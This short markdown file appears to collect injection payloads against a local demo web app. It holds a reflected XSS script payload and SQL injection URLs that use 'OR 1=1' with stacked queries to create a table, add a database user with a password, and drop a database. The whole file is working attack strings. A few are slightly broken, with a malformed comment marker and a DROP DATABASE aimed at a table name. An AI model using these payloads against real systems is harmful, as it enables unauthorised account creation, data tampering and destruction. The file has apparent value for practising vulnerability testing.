# XSS Injection

```
http://127.0.0.1:3000/welcome?name=<script>alert("Hello world")</script>
```

# SQL Injection

#### SQL Generate by GPT, exploit by K7

## Create Table

```
http://127.0.0.1:3000/login?username=test' OR 1=1; CREATE TABLE tableInjected(id INT, name VARCHAR(255)); --
```

## Create user

```
http://127.0.0.1:3000/login?username=test' OR 1=1; CREATE USER 'newUserInjected'@'127.0.0.1' IDENTIFIED BY 'Pass1234'; -    -
```

## Drop database previously created

```
http://127.0.0.1:3000/login?username=test' OR 1=1; DROP DATABASE tableInjected; --
```